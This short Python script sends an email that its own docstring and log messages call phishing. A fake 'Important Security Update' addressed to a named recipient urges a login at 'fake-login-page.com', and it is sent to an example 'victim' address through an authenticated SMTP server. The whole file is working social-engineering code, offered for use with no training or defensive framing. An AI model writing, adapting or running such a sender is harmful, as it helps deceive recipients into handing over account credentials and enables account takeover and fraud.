import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import logging

# Configuration
sender_email = 'youremail@example.com'
sender_password = 'yourpassword'
subject = 'Important Security Update'
body = """
Hello {name},

Please log in immediately to your account to secure it. 
Click the link below to access your account:

http://fake-login-page.com

Regards,
Your Security Team
"""

def send_email(receiver_email, name):
    """Send phishing email."""
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject
        
        # Create the body of the email
        message = body.format(name=name)
        msg.attach(MIMEText(message, 'plain'))
        
        # Set up the server and send the email
        server = smtplib.SMTP('smtp.example.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()

        logging.info(f"Phishing email sent to {receiver_email}")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# Example usage
if __name__ == '__main__':
    receiver_email = 'victim@example.com'
    send_email(receiver_email, 'John Doe')
